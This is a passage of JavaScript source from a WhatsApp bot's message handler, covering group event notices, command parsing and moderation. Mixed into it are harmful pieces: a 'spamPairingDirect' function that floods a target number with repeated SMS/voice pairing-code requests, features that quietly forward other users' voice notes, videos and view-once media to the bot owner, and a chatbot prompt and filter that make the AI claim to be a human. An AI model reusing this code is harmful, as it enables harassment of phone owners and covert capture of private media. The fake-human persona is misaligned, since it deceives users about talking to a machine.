      // ── LEAVE / REMOVE ──────────────────────────────────────────────────
      if (_STUB === 28 && _gs3.goodbye) {
        for (const pJid of _stubs3) {
          const mn = pJid.split("@")[0].split(":")[0].replace(/\D/g, "");
          let _ppic3 = null;
          try { _ppic3 = await mzazi.profilePictureUrl(pJid, "image"); } catch {}
          const cap =
            `╔════════════════════╗\n` +
            `║   🌙 *GOODBYE* 🌙   ║\n` +
            `╚════════════════════╝\n\n` +
            `💔 @${mn} has left.\n\n` +
            `📌 *Group:* ${_gName3}\n\n` +
            `_Thank you for being with us. Until we meet again..._ 🌠`;
          const img = await generateGoodbyeImage({ memberNumber: mn, groupName: _gName3, profilePicUrl: _ppic3 }).catch(() => null);
          await _send3(img, cap, [pJid]);
        }
      }

      // ── PROMOTE ─────────────────────────────────────────────────────────
      if (_STUB === 31 && _gs3.events) {
        for (const pJid of _stubs3) {
          const mn = pJid.split("@")[0].split(":")[0].replace(/\D/g, "");
          let _ppic3 = null;
          try { _ppic3 = await mzazi.profilePictureUrl(pJid, "image"); } catch {}
          const cap =
            `╔════════════════════╗\n` +
            `║  👑 *PROMOTED!* 👑  ║\n` +
            `╚════════════════════╝\n\n` +
            `⭐ @${mn} has been promoted!\n` +
            `🎖️ *New Role:* Admin\n\n` +
            `📌 *Group:* ${_gName3}\n\n` +
            `_Congratulations!_ 🎉`;
          const img = await generateEventImage({ memberNumber: mn, eventType: "promote", groupName: _gName3, profilePicUrl: _ppic3 }).catch(() => null);
          await _send3(img, cap, [pJid]);
        }
      }

      // ── DEMOTE ──────────────────────────────────────────────────────────
      if (_STUB === 32 && _gs3.events) {
        for (const pJid of _stubs3) {
          const mn = pJid.split("@")[0].split(":")[0].replace(/\D/g, "");
          let _ppic3 = null;
          try { _ppic3 = await mzazi.profilePictureUrl(pJid, "image"); } catch {}
          const cap =
            `╔════════════════════╗\n` +
            `║  📉 *DEMOTED* 📉   ║\n` +
            `╚════════════════════╝\n\n` +
            `@${mn} has been demoted.\n` +
            `🔻 *Admin rights removed*\n\n` +
            `📌 *Group:* ${_gName3}`;
          const img = await generateEventImage({ memberNumber: mn, eventType: "demote", groupName: _gName3, profilePicUrl: _ppic3 }).catch(() => null);
          await _send3(img, cap, [pJid]);
        }
      }

      // ── GROUP RENAMED ────────────────────────────────────────────────────
      if (_STUB === 11 && _gs3.events) {
        const newName = _stubs3[0] || "";
        const cap =
          `╔════════════════════╗\n` +
          `║  ✏️ *RENAMED* ✏️   ║\n` +
          `╚════════════════════╝\n\n` +
          `📌 Group name changed to:\n*${newName}*`;
        const img = await generateEventImage({ memberNumber: "", eventType: "subject", groupName: newName, details: `Was: ${_gName3}` }).catch(() => null);
        await _send3(img, cap, []);
      }

      // ── DESCRIPTION CHANGED ──────────────────────────────────────────────
      if (_STUB === 12 && _gs3.events) {
        const cap =
          `╔════════════════════╗\n` +
          `║  📝 *INFO UPDATE* 📝║\n` +
          `╚════════════════════╝\n\n` +
          `📌 *Group:* ${_gName3}\n\n` +
          `Group description was updated.`;
        const img = await generateEventImage({ memberNumber: "", eventType: "description", groupName: _gName3 }).catch(() => null);
        await _send3(img, cap, []);
      }

      // If this was a pure stub (no message body) we are done
      if (!m.message) return;
    }
    // ── End group event stubs ─────────────────────────────────────────────────

    if (!m.message) return;
    const body = getBody(m.message).trim();
    const message = m.message;
    const type = Object.keys(message)[0] || "";
    const budy = getBody(message);
    const sender = m.key.remoteJid;
    if (!sender || typeof sender !== "string") return;

    // ── ANTI-DELETE: detect revoke protocol messages ─────────────────────
    // Revoke notifications arrive either as messages.upsert protocol messages
    // or as messages.update patches, depending on the Baileys release/device.
    const protocolMessage =
      message.protocolMessage ||
      message.ephemeralMessage?.message?.protocolMessage ||
      message.viewOnceMessage?.message?.protocolMessage;
    const isRevoke = protocolMessage &&
      (protocolMessage.type === 0 ||
       protocolMessage.type === "REVOKE" ||
       String(protocolMessage.type).toUpperCase() === "REVOKE");

    if (isRevoke) {
      const revokedKey = protocolMessage.key || {};
      const cached = findCachedAntiDeleteMessage(revokedKey);
      if (!cached) return;

      const botPhoneNum = normalizeJid(mzazi.user?.id || "");
      const sessionDir = `./database/sessions/${botPhoneNum}`;
      const chatId = cached.chatId || revokedKey.remoteJid || sender;
      const isGroup2 = chatId.endsWith("@g.us");
      const groupSettings = loadJSON(`${sessionDir}/groups.json`, {});
      const dmSettings = loadJSON(`${sessionDir}/dm_settings.json`, {});
      const enabled = isGroup2
        ? !!groupSettings[chatId]?.antidelete
        : !!dmSettings[chatId]?.antidelete;

      if (!enabled) {
        deleteCachedAntiDeleteMessage(cached);
        return;
      }

      const { senderJid, senderNum, msgObj, caption } = cached;
      // Restore the deleted message directly to the original sender. In a
      // group, senderJid is the member who sent it; in a DM, it is the chat
      // participant. Never forward deleted content to the bot owner.
      const sourceJid = senderJid || chatId;
      const messageType = Object.keys(msgObj || {})[0] || "message";
      const mediaLabel = messageType === "imageMessage" ? "Image"
        : messageType === "videoMessage" ? "Video"
        : messageType === "audioMessage" ? (msgObj.audioMessage?.ptt ? "Voice note" : "Audio")
        : messageType === "stickerMessage" ? "Sticker"
        : messageType === "documentMessage" ? "Document"
        : "Text";
      const notice =
        `🗑️ *Anti-Delete Alert*\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 *From:* @${senderNum || "unknown"}\n` +
        `${isGroup2 ? `👥 *Chat:* ${chatId}\n` : "💬 *Chat:* Private message\n"}` +
        `📌 *Type:* ${mediaLabel}\n` +
        (caption ? `📝 *Caption:* ${caption}\n` : "") +
        `⏰ *Deleted:* ${new Date().toLocaleString()}\n` +
        `━━━━━━━━━━━━━━━━━━━━`;
      const contextInfo = {
        mentionedJid: senderJid ? [senderJid] : [],
        forwardingScore: 1,
        isForwarded: true,
      };

      try {
        const mediaTypes = new Set([
          "imageMessage",
          "videoMessage",
          "audioMessage",
          "stickerMessage",
          "documentMessage",
        ]);
        let sentMedia = false;

        if (mediaTypes.has(messageType)) {
          const media = msgObj[messageType];
          const hasMediaKey = !!(media?.mediaKey || media?.fileEncSha256);
          if (hasMediaKey) {
            try {
              const buffer = await downloadMediaMessage(
                { key: cached.key, message: msgObj },
                "buffer",
                {},
                {
                  logger: pino({ level: "silent" }),
                  reuploadRequest: mzazi.updateMediaMessage,
                }
              );
              const mediaPayload = messageType === "imageMessage"
                ? { image: buffer, caption: notice }
                : messageType === "videoMessage"
                  ? { video: buffer, caption: notice }
                  : messageType === "audioMessage"
                    ? { audio: buffer, mimetype: media.mimetype || "audio/mp4", ptt: !!media.ptt }
                    : messageType === "stickerMessage"
                      ? { sticker: buffer }
                      : {
                        document: buffer,
                        mimetype: media.mimetype || "application/octet-stream",
                        fileName: media.fileName || "deleted_file",
                        caption: notice,
                      };
              await mzazi.sendMessage(sourceJid, { ...mediaPayload, contextInfo });
              sentMedia = true;
              if (messageType === "audioMessage" || messageType === "stickerMessage") {
                await mzazi.sendMessage(sourceJid, { text: notice, contextInfo });
              }
            } catch (mediaError) {
              logger.warn("AntiDelete media restore failed:", mediaError?.message);
            }
          }
        }

        if (!sentMedia) {
          await mzazi.sendMessage(sourceJid, { text: notice, contextInfo });
        }
      } catch (restoreError) {
        logger.error("AntiDelete restore error:", restoreError?.message);
      } finally {
        deleteCachedAntiDeleteMessage(cached);
      }
      return;
    }

    // ── CACHE this message for antidelete ────────────────────────────────
    // Cache ALL real messages (including fromMe) so that antidelete catches
    // messages deleted by any participant, including the owner's own devices.
    // Skip only stub messages (group join/leave/promote notifications) — they
    // have no media key, causing "Cannot derive from empty media key" errors.
    if (m.key?.id && !m.messageStubType) {
      const _isGrp = sender.endsWith("@g.us");
      const _sndr = _isGrp ? (m.key.participant || sender) : sender;
      const _sNum = _sndr.split("@")[0].split(":")[0].replace(/[^0-9]/g, "");
      // Unwrap ephemeral (disappearing) messages before caching so the real
      // media type and keys are stored — without this the media label is wrong
      // and downloadMediaMessage fails when the message is later deleted.
      const _rawMsg = unwrapAntiDeleteMessage(message);
      const _mt = Object.keys(_rawMsg)[0];
      const _cap =
        _rawMsg.conversation ||
        _rawMsg.extendedTextMessage?.text ||
        _rawMsg[_mt]?.caption || "";
      const _cacheKey = antiDeleteCacheKey(m.key, sender);
      messageCache.set(_cacheKey, {
        cacheKey: _cacheKey,
        key: { ...m.key, remoteJid: m.key.remoteJid || sender },
        ts: Date.now(),
        chatId: sender,
        senderJid: _sndr,
        senderNum: _sNum,
        msgObj: _rawMsg,
        caption: _cap.slice(0, 200)
      });
    }

    const isGroup = sender.endsWith("@g.us");

    // In a group the real sender is m.key.participant; in DMs it's the remoteJid itself
    const msgSender = isGroup ? (m.key.participant || sender) : sender;

    // Canonical numeric form of the sender (no domain, no device suffix)
    const senderNumber = normalizeJid(msgSender);
    const senderNum = normalizeJid(msgSender);
    const botJid    = normalizeJid(mzazi.user?.id);           // pure digits, no suffix
     const botPhoneNum = jidToNumber(mzazi.user?.id);          // digits only, string
    const botLid    = mzazi.user?.lid ? normalizeJid(mzazi.user.lid) : null;

    ensureDir(`./database/sessions/${botPhoneNum}`);

    // ==================== OWNER DETECTION ====================
    // "owner" = the number linked to this bot session + any numbers in owners.json
    

    // The bot's own linked number is always an owner
    const botOwnerNumber = normalizeJid(mzazi.user?.id);
    const ownersList = getOwners().map(num => normalizeJid(String(num)));
    const ownerNumbers = [
      botOwnerNumber,
      ...(botLid ? [botLid] : []),
      ...ownersList
    ].filter(Boolean);
    
    const isOwner =
      m.key.fromMe ||                          // message sent by the bot itself
      ownerNumbers.includes(senderNumber);    
    // Works for both groups (uses participant) and DMs (uses remoteJid)

    
// Sticker→command map is loaded once at startup (see src/lib/database.js)
// and cached in `db.sticker`. Nothing here touches disk per-message.

     // sender's number is in owner list
    const settingsPath = `./database/sessions/${botPhoneNum}/settings.json`;
    // prefix handling
    const sessionSettings = loadJSON(`./database/sessions/${botPhoneNum}/settings.json`, {});
    const customPrefix = sessionSettings.customPrefix; // undefined = never set, "" = none mode, "x" = custom
    const noPrefixMode = customPrefix === "";           // explicitly set to none via .setprefix none

    let prefix = ".";
    let isCmd = false;
    let command = "";
    let args = [];

    if (noPrefixMode) {
      // No-prefix mode: every non-empty message is a potential command
      prefix = "";
      isCmd = budy.trim().length > 0;
      command = isCmd ? budy.trim().split(/ +/).shift().toLowerCase() : "";
      args = isCmd ? budy.trim().split(/ +/).slice(1) : [];
    } else if (customPrefix) {
      // Custom prefix set: use it, fall back to config prefix if message doesn't match
      const escaped = customPrefix.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
      if (new RegExp(`^${escaped}`).test(budy)) {
        prefix = customPrefix;
      } else if (config.prefix?.test?.(budy)) {
        prefix = budy.match(config.prefix)[0];
      } else {
        prefix = ".";
      }
      isCmd = budy.length > 0 && budy.startsWith(prefix);
      command = isCmd ? budy.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : "";
      args = isCmd ? budy.slice(prefix.length).trim().split(/ +/).slice(1) : [];
    } else {
      // Default: use config.prefix regex or "." fallback
      prefix = config.prefix?.test?.(budy) ? budy.match(config.prefix)[0] : ".";
      isCmd = budy.length > 0 && budy.startsWith(prefix);
      command = isCmd ? budy.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : "";
      args = isCmd ? budy.slice(prefix.length).trim().split(/ +/).slice(1) : [];
    }

    const text = args.join(" ");

    // ── CHAT / GROUP LOGGER ──────────────────────────────────────────────
    // Logged exactly once per incoming message — no file reads, no repeats.
    {
      let _logGroupName = sender;
      if (isGroup) {
        try {
          const _meta = await mzazi.groupMetadata(sender);
          _logGroupName = _meta.subject || sender;
        } catch {}
      }
      logIncomingMessage({
        senderName: m.pushName || senderNumber,
        senderNumber,
        isGroup,
        groupName: _logGroupName,
        messageType: type,
        text: budy,
      });
      if (isGroup && isCmd) {
        logGroupCommand({
          groupName: _logGroupName,
          senderName: m.pushName || senderNumber,
          senderNumber,
          command: `${prefix}${command}`,
        });
      }
    }

    const senderPureNumber = jidToNumber(msgSender);

    // ── PER-SESSION paidUsers ────────────────────────────────────────────
    const sessionPaidPath = `./database/sessions/${botPhoneNum}/paid.json`;
    const sessionPaidUsers = loadJSON(sessionPaidPath, []);
    const saveSessionPaid = () => saveJSON(sessionPaidPath, sessionPaidUsers);

    const isPaid =
      sessionPaidUsers.includes(msgSender) ||
      sessionPaidUsers.includes(senderPureNumber) ||
      sessionPaidUsers.includes(normalizeJid(msgSender)) ||
      isOwner;

    const botName = getBotName(botPhoneNum);
    const reply = async (txt) => mzazi.sendMessage(sender, { text: txt });

    // ==================== GROUP METADATA ====================
    // Hoisted so groupAdmins and participants are available everywhere below
    let isAdmin    = false;
    let isBotAdmin = false;
    let groupAdmins    = [];
    let participants   = [];

    if (isGroup) {
      const metadata = await mzazi.groupMetadata(sender);
      participants = metadata.participants || [];

      groupAdmins = participants
        .filter(v => v.admin)
        .map(v => normalizeJid(v.id));

      isAdmin    = groupAdmins.includes(senderNumber);
      isBotAdmin = groupAdmins.includes(normalizeJid(botJid));
    }

    // ========== MODE SETTINGS (self / public) ==========
    
    let currentSettings = loadJSON(settingsPath, { publicMode: true, selfMode: false });
    if (!currentSettings.publicMode && !currentSettings.selfMode) {
      // Auto-enable public mode for both groups and DMs when neither mode is configured
      currentSettings.publicMode = true;
      saveJSON(settingsPath, currentSettings);
      logger.info(`🔧 Auto-fixed settings for ${botPhoneNum}: publicMode forced true`);
    }
    if (currentSettings.selfMode && !isOwner) return;
    if (!currentSettings.publicMode && !currentSettings.selfMode && !isOwner) return;

    // ========== MZAZIREPLY (with image and newsletter style) ==========
    
const mzazireply2 = async (txt, { quoted = null, mentions = [] } = {}) => {
  const ctx = {
    forwardingScore: 999, isForwarded: true,
    forwardedNewsletterMessageInfo: { newsletterJid: "120363425539800408@newsletter", newsletterName: botName.toUpperCase(), serverMessageId: 143 },
    externalAdReply: { title: botName.toUpperCase(), body: txt.slice(0, 60), sourceUrl: `https://wa.me/c/${botPhoneNum}`, mediaType: 1, showAdAttribution: true },
    mentionedJid: mentions,
    ...(quoted ? { stanzaId: quoted.key?.id, participant: quoted.key?.remoteJid, quotedMessage: quoted.message } : {}),
  };
  try {
    await mzazi.sendMessage(sender, { text: txt, contextInfo: ctx }, { quoted });
  } catch {
    try { await mzazi.sendMessage(sender, { text: txt }); } catch {}
  }
};
    const getMenuPic = () => {
      const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
      const defaultMenuPic = "./media/menu.jpg";
      return fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;
    };
    const sessionFile = (name) => `./database/sessions/${botPhoneNum}/${name}`;

    const getGroupSettings = (groupJid) => {
      const groups = loadJSON(sessionFile("groups.json"), {});
      return groups[groupJid] || {};
    };

    const setGroupSetting = (groupJid, key, value) => {
      const groups = loadJSON(sessionFile("groups.json"), {});
      if (!groups[groupJid]) groups[groupJid] = {};
      groups[groupJid][key] = value;
      saveJSON(sessionFile("groups.json"), groups);
    };

    const getWarns = (groupJid, userJid) => {
      const warns = loadJSON(sessionFile("warns.json"), {});
      return (warns[groupJid] && warns[groupJid][userJid]) || 0;
    };

    const addWarn = (groupJid, userJid) => {
      const warns = loadJSON(sessionFile("warns.json"), {});
      if (!warns[groupJid]) warns[groupJid] = {};
      warns[groupJid][userJid] = (warns[groupJid][userJid] || 0) + 1;
      saveJSON(sessionFile("warns.json"), warns);
      return warns[groupJid][userJid];
    };

    const resetWarn = (groupJid, userJid) => {
      const warns = loadJSON(sessionFile("warns.json"), {});
      if (warns[groupJid]) warns[groupJid][userJid] = 0;
      saveJSON(sessionFile("warns.json"), warns);
    };

    const getToggle = (name) => loadJSON(sessionFile(`${name}.json`), { enabled: false });
    const setToggle = (name, enabled) => saveJSON(sessionFile(`${name}.json`), { enabled });

    const getChatbotStatus = (chatId) => {
      const chatbot = loadJSON(sessionFile("chatbot.json"), {});
      return chatbot[chatId] || false;
    };

    const setChatbotStatus = (chatId, enabled) => {
      const chatbot = loadJSON(sessionFile("chatbot.json"), {});
      if (enabled) chatbot[chatId] = true;
      else delete chatbot[chatId];
      saveJSON(sessionFile("chatbot.json"), chatbot);
    };

    async function handleAutoTyping() {
      const cfg = getToggle("autotyping");
      if (!cfg.enabled || m.key.fromMe || !budy) return;
      try {
        await mzazi.sendPresenceUpdate("composing", sender);
        const delay = Math.min(8000, Math.max(2000, budy.length * 100));
        await new Promise((r) => setTimeout(r, delay));
        await mzazi.sendPresenceUpdate("paused", sender);
      } catch (e) {}
    }
// ── SPAM PAIRING FUNCTION ──────────────────────────────────────────
async function spamPairingDirect(targetNumber, count = 20) {
  const results = { success: 0, failed: 0, errors: [] };
  const axios = require('axios');

  for (let i = 0; i < count; i++) {
    try {
      // WhatsApp's public pairing endpoint (reverse engineered)
      const response = await axios.post(
        'https://wa.me/pair',
        {
          phone: targetNumber,
          method: i % 2 === 0 ? 'sms' : 'voice',
          platform: 'android',
          version: '2.24.22.85'
        },
        {
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'WhatsApp/2.24.22.85 Android'
          },
          timeout: 10000
        }
      );

      if (response.status === 200) {
        results.success++;
      } else {
        results.failed++;
        results.errors.push(`Attempt ${i + 1}: Status ${response.status}`);
      }

      await new Promise(r => setTimeout(r, 300));

    } catch (err) {
      results.failed++;
      results.errors.push(`Attempt ${i + 1}: ${err.message || 'unknown'}`);
    }
  }

  return results;
}



























    async function forwardMediaToOwner(kind, mediaBuffer, caption) {
      const cfg = getToggle(kind === "audio" ? "autorecord_audio" : "autorecord_video");
      if (!cfg.enabled || !ownersList[0]) return;

      const ownerDM = `${ownersList[0]}@s.whatsapp.net`;
      if (kind === "audio") {
        await mzazi.sendMessage(ownerDM, {
          audio: mediaBuffer,
          mimetype: "audio/mp4",
          ptt: true,
          caption: `Auto-recorded audio from @${senderNumber}\n${caption || ""}`
        });
      } else {
        await mzazi.sendMessage(ownerDM, {
          video: mediaBuffer,
          caption: `Auto-recorded video from @${senderNumber}\n${caption || ""}`
        });
      }
    }

    const chatMemory = { messages: new Map(), userInfo: new Map() };
    const AI_ENDPOINTS = [
      {
        name: "ZellAPI",
        url: (txt) => `https://zellapi.autos/ai/chatbot?text=${encodeURIComponent(txt)}`,
        parse: (data) => data?.result
      },
      {
        name: "Hercai",
        url: (txt) => `https://hercai.onrender.com/gemini/hercai?question=${encodeURIComponent(txt)}`,
        parse: (data) => data?.reply
      },
      {
        name: "SparkAPI",
        url: (txt) => `https://discardapi.dpdns.org/api/chat/spark?apikey=guru&text=${encodeURIComponent(txt)}`,
        parse: (data) => data?.result?.answer
      },
      {
        name: "LlamaAPI",
        url: (txt) => `https://discardapi.dpdns.org/api/bot/llama?apikey=guru&text=${encodeURIComponent(txt)}`,
        parse: (data) => data?.result
      }
    ];

    function extractUserInfo(userMessage) {
      const info = {};
      const low = userMessage.toLowerCase();
      if (low.includes("my name is")) info.name = userMessage.split(/my name is/i)[1]?.trim().split(" ")[0];
      if (low.includes("i am") && low.includes("years old")) info.age = userMessage.match(/\d+/)?.[0];
      if (low.includes("i live in") || low.includes("i am from")) {
        info.location = userMessage.split(/(?:i live in|i am from)/i)[1]?.trim().split(/[.,!?]/)[0];
      }
      return info;
    }

    async function getAIResponse(userMessage, userContext) {
      const prompt = `You are a casual, friendly human chatting on WhatsApp. Always reply in English only.

RULES:
1. Always respond in English only.
2. Keep responses short, 1-2 lines max.
3. Be casual and natural.
4. Use emojis naturally.
5. Never reveal you are an AI or bot.

Your name is ${botName}.

Previous conversation:
${userContext.messages.join("\n")}

User info:
${JSON.stringify(userContext.userInfo, null, 2)}

User: ${userMessage}
You:`.trim();

      for (const api of AI_ENDPOINTS) {
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 10000);
          const response = await fetch(api.url(prompt), { signal: controller.signal });
          clearTimeout(timeoutId);
          if (!response.ok) continue;

          const data = await response.json();
          const result = api.parse(data);
          if (!result) continue;

          const cleaned = result
            .trim()
            .replace(/winks/g, "😉")
            .replace(/eye roll/g, "🙄")
            .replace(/shrug/g, "🤷‍♂️")
            .replace(/raises eyebrow/g, "🤨")
            .replace(/smiles/g, "😊")
            .replace(/laughs/g, "😂")
            .replace(/cries/g, "😢")
            .replace(/thinks/g, "🤔")
            .replace(/sleeps/g, "😴")
            .replace(/google/gi, botName)
            .replace(/a large language model/gi, "just a person")
            .replace(/Remember:.*$/g, "")
            .replace(/IMPORTANT:.*$/g, "")
            .replace(/^[A-Z\s]+:.*$/gm, "")
            .replace(/^[•-]\s.*$/gm, "")
            .replace(/^✅.*$/gm, "")
            .replace(/^❌.*$/gm, "")
            .replace(/\n\s*\n/g, "\n")
            .trim();

          if (cleaned) return cleaned;
        } catch (e) {}
      }
      return null;
    }

    async function handleChatbotResponse() {
      if (m.key.fromMe || isCmd || !budy || !getChatbotStatus(sender)) return;

      const botJids = [
        botJid,
        botLid,
        botPhoneNum ? `${botPhoneNum}@s.whatsapp.net` : "",
        botPhoneNum ? `${botPhoneNum}@whatsapp.net` : ""
      ]
        .filter(Boolean)
        .map(normalizeJid);

      let shouldReply = !isGroup;
      let cleanedMessage = budy;

      if (isGroup) {
        const mentionedJid = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
        const quotedParticipant = m.message?.extendedTextMessage?.contextInfo?.participant;
        const isBotMentioned =
          mentionedJid.some((jid) => botJids.includes(normalizeJid(jid))) ||
          cleanedMessage.includes(`@${botPhoneNum}`);
        const isReplyToBot = quotedParticipant && botJids.includes(normalizeJid(quotedParticipant));
        shouldReply = isBotMentioned || isReplyToBot;
        cleanedMessage = cleanedMessage.replace(new RegExp(`@${botPhoneNum}`, "g"), "").trim();
      }

      if (!shouldReply || !cleanedMessage) return;

      if (!chatMemory.messages.has(msgSender)) {
        chatMemory.messages.set(msgSender, []);
        chatMemory.userInfo.set(msgSender, {});
      }

      const userInfo = extractUserInfo(cleanedMessage);
      if (Object.keys(userInfo).length) {
        chatMemory.userInfo.set(msgSender, {
          ...chatMemory.userInfo.get(msgSender),
          ...userInfo
        });
      }

      const messages = chatMemory.messages.get(msgSender);
      messages.push(cleanedMessage);
      if (messages.length > 20) messages.shift();

      try {
        await mzazi.sendPresenceUpdate("composing", sender);
        await new Promise((r) => setTimeout(r, Math.random() * 3000 + 2000));
      } catch (e) {}

      const response = await getAIResponse(cleanedMessage, {
        messages: chatMemory.messages.get(msgSender),
        userInfo: chatMemory.userInfo.get(msgSender)
      });

      await mzazi.sendMessage(sender, { text: response || "Hmm, I am having trouble replying right now." });
    }

    await handleAutoTyping();

    if (type === "audioMessage" && message.audioMessage?.ptt) {
      const buffer = await downloadMediaMessage(m, "buffer", {}, {
        logger: pino({ level: "silent" }),
        reuploadRequest: mzazi.updateMediaMessage
      });
      await forwardMediaToOwner("audio", buffer, message.audioMessage.caption || "");
    }

    if (type === "videoMessage") {
      const buffer = await downloadMediaMessage(m, "buffer", {}, {
        logger: pino({ level: "silent" }),
        reuploadRequest: mzazi.updateMediaMessage
      });
      await forwardMediaToOwner("video", buffer, message.videoMessage.caption || "");
    }

    // ── ANTI-VIEW-ONCE (groups + DMs) ──────────────────────────────────────
    {
      const _avUnwrapped = message?.ephemeralMessage?.message || message;
      const _vOnce =
        _avUnwrapped?.viewOnceMessage?.message ||
        _avUnwrapped?.viewOnceMessageV2?.message ||
        _avUnwrapped?.viewOnceMessageV2Extension?.message;

      if (_vOnce && !m.key.fromMe) {
        const _vType = Object.keys(_vOnce)[0];

        // Determine whether antiviewonce is enabled for this chat
        const _avoEnabled = (() => {
          if (isGroup) return getGroupSettings(sender).antiviewonce;
          // DM: check per-chat or global dm_settings.json
          const _dm = loadJSON(sessionFile("dm_settings.json"), {});
          return _dm[sender]?.antiviewonce || _dm["__global__"]?.antiviewonce;
        })();

        if (_avoEnabled) {
          try {
            // Pass the full original message — Baileys 7.x downloadMediaMessage
            // internally unwraps viewOnceMessage / viewOnceMessageV2 wrappers.
            const _avBuf = await downloadMediaMessage(m, "buffer", {}, {
              logger: pino({ level: "silent" }),
              reuploadRequest: mzazi.updateMediaMessage
            });

            const _avCaption =
              `👁️ *Anti-View-Once*\n` +
              `━━━━━━━━━━━━━━━━━━\n` +
              `👤 *From:* @${senderNumber}\n` +
              `📌 *Type:* ${_vType === "imageMessage" ? "🖼️ Image" : _vType === "videoMessage" ? "🎥 Video" : "🎤 Audio"}\n` +
              `━━━━━━━━━━━━━━━━━━`;

            // Groups: resend in the group. DMs: forward to owner's DM.
            const _avDest = isGroup ? sender : (() => {
              const _ow = loadJSON(sessionFile("owners.json"), []);
              return _ow[0]
                ? `${String(_ow[0]).replace(/\D/g, "")}@s.whatsapp.net`
                : `${botPhoneNum}@s.whatsapp.net`;
            })();
            const _avMentions = isGroup ? [msgSender] : [];

            if (_vType === "imageMessage") {
              await mzazi.sendMessage(_avDest, { image: _avBuf, caption: _avCaption, mentions: _avMentions });
            } else if (_vType === "videoMessage") {
              await mzazi.sendMessage(_avDest, { video: _avBuf, caption: _avCaption, mentions: _avMentions });
            } else if (_vType === "audioMessage") {
              await mzazi.sendMessage(_avDest, { audio: _avBuf, mimetype: "audio/mp4", ptt: false });
              await mzazi.sendMessage(_avDest, { text: _avCaption, mentions: _avMentions });
            }
          } catch (e) {
            logger.error("AntiViewOnce error:", e.message);
          }
        }
      }
    }

    if (isGroup) {
      const gs = getGroupSettings(sender);

      if (!isOwner && !isAdmin) {
        const mentionedJids = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];

        // NOTE: antilink is handled by the mode-based block below (applyMode).
        // The old boolean handler was removed to prevent duplicate handling.

        if (gs.antitag && mentionedJids.length >= 5) {
          if (isBotAdmin) {
            await mzazi.sendMessage(sender, { delete: m.key });
            await mzazi.sendMessage(sender, {
              text: `Warning @${senderNumber}, mass-tagging is not allowed.`,
              mentions: [msgSender]
            });
          }
          return;
        }

        // groupAdmins is now hoisted — safe to use here
        if (gs.antitagadmin && mentionedJids.some((jid) => groupAdmins.includes(normalizeJid(jid)))) {
          if (isBotAdmin) {
            await mzazi.sendMessage(sender, { delete: m.key });
            await mzazi.sendMessage(sender, {
              text: `Warning @${senderNumber}, tagging admins is not allowed.`,
              mentions: [msgSender]
            });
          }
          return;
        }

        // participants is now hoisted — safe to use here
        const hasMentionAll =
          budy.includes("@everyone") ||
          budy.includes("@all") ||
          (participants.length > 0 && mentionedJids.length >= participants.length - 1 && mentionedJids.length > 0);

        if (gs.antimentiongroup && hasMentionAll) {
          if (isBotAdmin) {
            await mzazi.sendMessage(sender, { delete: m.key });
            await mzazi.sendMessage(sender, {
              text: `Warning @${senderNumber}, mentioning the whole group is not allowed.`,
              mentions: [msgSender]
            });
          }
          return;
        }
      }
    }

    await handleChatbotResponse();

    // ─────────────────────────────────────────────────────────────────────────
    // STICKER COMMAND SYSTEM — DETECTION MIDDLEWARE
    // PLACEMENT: After handleChatbotResponse() and BEFORE the `if (!isCmd) return;`
    //            guard, so sticker-triggered commands reach the  switch() block.
    //
    // Looks the sticker's fileSha256 (base64) up in the cached db.sticker map
    // (database/sticker.json, loaded once at startup — never touched here).
    // If a match is found, it overwrites `command` so the switch() block runs
    // exactly as if the user had typed that command with the prefix.
    // ─────────────────────────────────────────────────────────────────────────
    if (m.message?.stickerMessage) {
        const rawSha = m.message.stickerMessage.fileSha256;

        if (rawSha) {
            const receivedId = Buffer.from(rawSha).toString("base64");
            const mapping = db.sticker.stickers?.[receivedId];

            if (mapping) {
                command = mapping.command;
                isCmd = true;
                logger.cmd(`.${command} (via sticker)`);
            }
        }
    }

    // ═══════════════════════════════════════════════════════
    //  AUTO STATUS VIEW & LIKE
    // ═══════════════════════════════════════════════════════
    if (sender === 'status@broadcast') {
      try {
        const _cfgView = getToggle("autostatus");
        const _cfgLike = getToggle("autolike");
        if (_cfgView.enabled) {
          try {
            await mzazi.readMessages([m.key]);
          } catch (e) {}
        }
        if (_cfgLike.enabled) {
          try {
            const _ssPath = sessionFile("statusSettings.json");
            const _ss = loadJSON(_ssPath, { emoji: "❤️" });
            await mzazi.sendMessage(sender, {
              react: { text: _ss.emoji || "❤️", key: m.key }
            });
          } catch (e) {}
        }
      } catch (e) {}
      if (!isCmd) return;
    }

    // ═══════════════════════════════════════════════════════
    //  GROUP ANTI-ENFORCEMENT (antilink / antisticker / antiimage)
    // ═══════════════════════════════════════════════════════
    if (isGroup && !m.key.fromMe && !isOwner && !isAdmin) {
      const _gs = getGroupSettings(sender);

      // Helper: apply mode action (delete / warn / kick)
      const applyMode = async (mode, label) => {
        if (!mode || mode === 'off') return false;
        try {
          // Always delete the offending message first
          try {
            await mzazi.sendMessage(sender, { delete: m.key });
          } catch (e) {}

          if (mode === 'delete') {
            await mzazi.sendMessage(sender, {
              text: `🚫 @${senderNum} — ${label} are not allowed here. Message deleted.`,
              mentions: [msgSender]
            });
          } else if (mode === 'warn') {
            const warnCount = addWarn(sender, msgSender);
            if (warnCount >= 3) {
              await mzazi.sendMessage(sender, {
                text: `⛔ @${senderNum} has been kicked! Reason: 3 warnings for sending ${label}.`,
                mentions: [msgSender]
              });
              try { await mzazi.groupParticipantsUpdate(sender, [msgSender], 'remove'); } catch (e) {}
              resetWarn(sender, msgSender);
            } else {
              await mzazi.sendMessage(sender, {
                text: `⚠️ *Warning ${warnCount}/3*\n@${senderNum} — ${label} are not allowed here! (${3 - warnCount} warning(s) left before kick)`,
                mentions: [msgSender]
              });
            }
          } else if (mode === 'kick') {
            await mzazi.sendMessage(sender, {
              text: `👢 @${senderNum} has been kicked for sending ${label}.`,
              mentions: [msgSender]
            });
            try { await mzazi.groupParticipantsUpdate(sender, [msgSender], 'remove'); } catch (e) {}
          }
          return true;
        } catch (e) {
          return false;
        }
      };

